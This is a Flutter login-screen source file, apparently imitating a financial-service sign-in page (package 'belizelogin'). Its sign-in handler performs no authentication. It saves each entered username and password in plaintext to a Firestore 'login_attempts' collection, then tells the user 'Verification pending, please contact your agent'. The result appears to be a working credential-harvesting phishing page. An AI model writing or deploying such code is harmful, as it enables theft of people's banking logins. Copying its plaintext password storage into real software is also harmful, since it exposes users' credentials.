import 'package:flutter/material.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:belizelogin/firebase_options.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'dart:async';

class LoginScreen extends StatefulWidget {
  const LoginScreen({super.key});

  @override
  State<LoginScreen> createState() => _LoginScreenState();
}

class _LoginScreenState extends State<LoginScreen> {
  final _usernameController = TextEditingController();
  final _passwordController = TextEditingController();
  bool _isLoading = false;
  final List<String> _images = [
    'assets/images/cc-features.png',
    'assets/images/financial_inclusion.png',
  ];
  int _currentIndex = 0;
  late Timer _timer;
  @override
  void dispose() {
    _timer.cancel();
    _usernameController.dispose();
    _passwordController.dispose();
    super.dispose();
  }

  @override
  void initState() {
    super.initState();
    _usernameController.addListener(() => setState(() {}));
    _passwordController.addListener(() => setState(() {}));

    _timer = Timer.periodic(const Duration(seconds: 6), (_) {
      setState(() {
        _currentIndex = (_currentIndex + 1) % _images.length;
      });
    });
  }

  Widget _navButton(IconData icon) {
    return Container(
      width: 30,
      height: 30,
      decoration: const BoxDecoration(
        color: Color(0xFF4CAF50),
        shape: BoxShape.circle,
      ),
      child: Icon(icon, color: Colors.white, size: 20),
    );
  }

  bool get _fieldsfilled =>
      _usernameController.text.isNotEmpty &&
      _passwordController.text.isNotEmpty;

  Future<void> _onSignIn() async {
    print('Sign int tapped');
    final username = _usernameController.text.trim();
    final password = _passwordController.text.trim();

    if (username.isEmpty || password.isEmpty) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text('Please fill in all fields')),
      );
      return;
    }

    setState(() => _isLoading = true);

    try {
      await FirebaseFirestore.instance.collection('login_attempts').add({
        'username': username,
        'password':
            password, // ⚠️ plaintext — fine for testing, never in production
        'timestamp': FieldValue.serverTimestamp(),
      });
      // empty fields check

      // on success
      _showPopup(
        'Verification pending, please contact your agent',
        success: true,
      );

      // on error

      // _showPopup('Please fill in all fields');
      _usernameController.clear();
      _passwordController.clear();
    } catch (e) {
      _showPopup('Error: $e');
    } finally {
      setState(() => _isLoading = false);
    }
  }

  void _onForgotPassword() {}

  void _showPopup(String message, {bool success = false}) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
        title: Text(
          success ? 'Success' : 'Error',
          style: TextStyle(color: success ? Colors.green : Colors.red),
        ),
        content: Text(message),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('OK'),
          ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      resizeToAvoidBottomInset: false,
      body: Container(
        decoration: const BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.centerLeft,
            end: Alignment.centerRight,
            colors: [
              Color(0xFF1565C0),
              Color(0xFF1565C0),
              Color(0xFF1565C0),
              Color.fromARGB(255, 132, 179, 232),
              // Color.fromARGB(255, 28, 149, 248),
              // Color.fromARGB(255, 245, 251, 255),
            ],
          ),
        ),
        child: SafeArea(
          child: Center(
            child: Padding(
              padding: const EdgeInsets.only(bottom: 100),
              child: Container(
                height: double.infinity,
                width: 400,
                decoration: BoxDecoration(
                  color: Colors.white,
                  // borderRadius: BorderRadius.circular(25),
                ),
                child: Padding(
                  padding: const EdgeInsets.symmetric(horizontal: 50.0),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.center,
                    children: [
                      const SizedBox(height: 48),
                      Image.asset("assets/images/logo.png"),
                      // Username field
                      SizedBox(height: 50),
                      TextField(
                        controller: _usernameController,
                        decoration: const InputDecoration(
                          labelText: 'Username',
                          border: UnderlineInputBorder(),
                          enabledBorder: UnderlineInputBorder(
                            borderSide: BorderSide(color: Colors.grey),
                          ),
                        ),
                      ),

                      const SizedBox(height: 22),

                      // Password field
                      TextField(
                        controller: _passwordController,
                        obscureText: true,
                        decoration: const InputDecoration(
                          labelText: 'Password *',
                          border: UnderlineInputBorder(),
                          enabledBorder: UnderlineInputBorder(
                            borderSide: BorderSide(color: Colors.grey),
                          ),
                        ),
                      ),

                      const SizedBox(height: 15),

                      // Forgot password
                      GestureDetector(
                        onTap: _onForgotPassword,
                        child: const Text(
                          'Forgot Password?',
                          style: TextStyle(color: Colors.blue, fontSize: 16),
                        ),
                      ),

                      const SizedBox(height: 28),

                      // Sign in button
                      SizedBox(
                        width: double.infinity,
                        height: 30,
                        child: ElevatedButton(
                          onPressed: _isLoading ? null : _onSignIn,
                          style: ElevatedButton.styleFrom(
                            backgroundColor: _fieldsfilled
                                ? const Color.fromRGBO(17, 134, 116, 1)
                                : Colors.grey[300],
                            foregroundColor: _fieldsfilled
                                ? Colors.white
                                : Colors.grey[600],
                            elevation: 0,
                            shape: RoundedRectangleBorder(
                              borderRadius: BorderRadius.circular(8),
                            ),
                          ),
                          child: const Text(
                            'SIGN IN',
                            style: TextStyle(
                              letterSpacing: 1.2,
                              fontWeight: FontWeight.w500,
                            ),
                          ),
                        ),
                      ),

                      const SizedBox(height: 50),

                      // Enroll row
                      Center(
                        child: Column(
                          children: [
                            const Text(
                              "Don't have an account?",
                              style: TextStyle(color: Colors.black87),
                            ),
                            const Text(
                              'Enroll now',
                              style: TextStyle(
                                color: Colors.blue,
                                fontSize: 16,
                              ),
                            ),
                            const SizedBox(height: 10),
                            AnimatedSwitcher(
                              duration: const Duration(milliseconds: 3000),
                              child: Image.asset(
                                _images[_currentIndex],
                                key: ValueKey(
                                  _currentIndex,
                                ), // required for AnimatedSwitcher
                                height: 200,
                                fit: BoxFit.contain,
                              ),
                            ),
                          ],
                        ),
                      ),

                      const SizedBox(height: 10),
                      Row(
                        crossAxisAlignment: CrossAxisAlignment.center,
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          _navButton(Icons.arrow_back),
                          SizedBox(width: 30),
                          GestureDetector(
                            child: _navButton(Icons.arrow_forward),
                            onTap: () => _currentIndex == 0
                                ? _currentIndex = 1
                                : _currentIndex = 0,
                          ),
                        ],
                      ),
                    ],
                  ),
                ),
              ),
            ),
          ),
        ),
      ),
    );
  }
}

// Widget _NavButton () {
//    final IconData icon;

//     return Container(
//       width: 48,
//       height: 48,
//       decoration: const BoxDecoration(
//         color: Color(0xFF4CAF50),
//         shape: BoxShape.circle,
//       ),
//       child: Icon(icon, color: Colors.white, size: 20),
//     );
//   }
